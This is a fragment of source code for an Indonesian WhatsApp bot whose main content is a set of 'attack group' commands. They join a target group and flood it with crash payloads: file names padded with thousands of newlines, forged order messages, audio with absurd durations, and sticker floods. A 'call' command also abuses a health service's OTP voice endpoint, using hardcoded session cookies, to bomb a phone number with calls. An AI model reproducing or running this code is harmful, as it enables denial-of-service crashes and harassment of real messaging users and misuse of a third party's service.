"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "DE4YOUJEMBOT-17 Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "DE4YOUJEMBOT-17 Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE de4youjembot-17`", fileName: `de4youjembot-17 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE de4youjembot-17`", fileName: `de4youjembot-17 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 JAM !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 JAM !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube bii`",
"message": `${button}`,
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 JAM !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V2 ( PAKE ID GROUP )
case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "DE4YOUJEMBOT-17 Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "YOUTUBE DE4YOUJEMBOT-17 Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE DE4YOUJEMBOT-17 Bug🔥`", fileName: `DE4YOUJEMBOT-17 Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE DE4YOUJEMBOT-17 Bug🔥`", fileName: `DE4YOUJEMBOT-17 Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb DE4YOUJEMBOT-17 Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb DE4YOUJEMBOT-17 Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube DE4YOUJEMBOT-17 Bug🔥`",
"message": `${button}`,
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb DE4YOUJEMBOT-17 Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb DE4YOUJEMBOT-17 Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
// LAST DI ATAS
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Biiofc.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case "sticker": 
case "s": {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Biiofc.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "qc": {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!quoted){
const getname = await Biiofc.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "owner": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `*Hai Kak @${sender.split("@")[0]}, Nih Owner Ku, Kalo Mau Buy Peralatan Hosting Bisa Langsung Chat Ownerku Atau Join Group Nya.*
*https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF*`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "ownsc": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `*_Hai Kak @${sender.split("@")[0]}, Nih Owner Pemilik Sc, Jangan Digalakin!! Kalo Mau Sc Buy Di Owner Ku.._*`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: fkontak })
}
break
case "call":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285798145596`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
